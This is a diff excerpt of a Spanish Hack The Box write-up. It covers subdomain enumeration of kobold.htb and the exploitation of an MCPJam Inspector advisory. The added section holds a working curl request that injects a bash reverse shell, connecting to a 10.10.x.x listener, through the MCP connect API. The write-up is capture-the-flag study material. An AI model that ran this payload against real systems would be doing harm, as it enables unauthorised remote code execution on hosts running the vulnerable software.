@@ -24,3 +24,22 @@ ffuf -c -u https://kobold.htb -H "Host: FUZZ.kobold.htb" -w /usr/share/wordlists
 
 Encontrando los subdominios `mcp` y `bin`, los añadiremos al `/etc/hosts`
 Navegaremos a `mcp` nos encontramos con MCPJam Inspector el cual buscando en internet tiene una vulnerabilidad
+`https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6`
+
+```shell
+curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
+  -H "Content-Type: application/json" \
+  -d '{
+    "serverConfig": {
+      "command": "bash",
+      "args": [
+        "-c",
+        "bash -i >& /dev/tcp/10.10.x.x/4444 0>&1"
+      ],
+      "env": {}
+    },
+    "serverId": "pwned"
+  }'
+```
+
+Obteniendo una shell como `ben`
